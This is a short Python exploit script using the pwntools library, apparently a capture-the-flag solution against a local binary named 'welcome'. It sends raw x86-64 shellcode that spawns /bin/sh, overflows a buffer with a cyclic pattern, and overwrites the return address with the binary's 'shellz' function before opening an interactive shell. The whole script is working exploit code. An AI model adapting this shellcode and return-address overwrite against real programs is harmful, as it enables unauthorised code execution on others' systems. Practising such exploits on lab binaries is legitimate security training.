#!/bin/python3

from pwn import *

proc = process("./welcome")
elf = ELF("./welcome")

def debugger(): 
    pause()
    gdb.attach(proc, gdbscript="b* 0x0000000000401449", gdb_args=["-ix", "/home/kaligula/.gdbinit_pwndbg"])
    pause()

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
proc.sendline(shellcode)

padding = cyclic(cyclic_find("qaac"))
rip = p64(elf.sym["shellz"])
payload = padding + rip
print(payload)

#debugger()

proc.sendline(payload)
proc.interactive()
proc.close()
